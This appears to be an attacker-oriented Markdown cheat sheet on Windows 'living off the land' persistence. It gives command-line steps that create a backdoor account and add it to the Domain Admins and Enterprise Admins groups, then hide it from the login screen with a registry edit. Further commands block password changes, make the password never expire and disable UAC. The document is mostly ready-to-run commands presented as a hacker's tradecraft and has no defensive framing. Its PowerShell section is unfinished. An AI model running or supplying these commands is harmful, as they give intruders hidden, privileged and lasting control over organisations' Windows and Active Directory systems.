# Living off the Land

Normally you wouldn't create an account since it is intrusive but hackers had to avoid writing malware on disk as much as possible. Make your decisions wisely.

## 01 - Command Prompt

- Method 1

```
C:\> net user sysadmin s3cur3d+1T /add /y

C:\> net group "Domain Admins" sysadmin /add /domain

C:\> net group "Enterprise Admins" sysadmin /add /domain

C:\> net user sysadmin /domain /expires:never /y
```

- Method 2

```
C:\> dsadd user "cn=<username>,cn=Users,dc=<domain>,dc=<tdl>" -pwd <password>
```

Makes the user account invisible from the Windows Login screen

```
C:\> reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v sysadmin /t REG_DWORD /d 0 /f
```

Sometimes it's a bit annoying when losing access that somebody changed the password whatever if it's on purpose or accidental. This `/passwordchg:<YES | NO>` option will prevent it from happening.

```
C:\> net user sysadmin /passwordchg:no
```

Never expire the password (this command is intrusive so be careful)

```
C:\> net accounts /maxpwage:unlimited
```

Disabling UAC that allows the hacker to take full control

```
C:\> reg.exe add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
```

Enabling UAC to make the admin restrictive

```
C:\> reg.exe add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
```

## 02 - Powershell

TODO: Create user account in the domain controller

```
PS C:\> New-LocalUser -Name sysadmin -NoPassword
```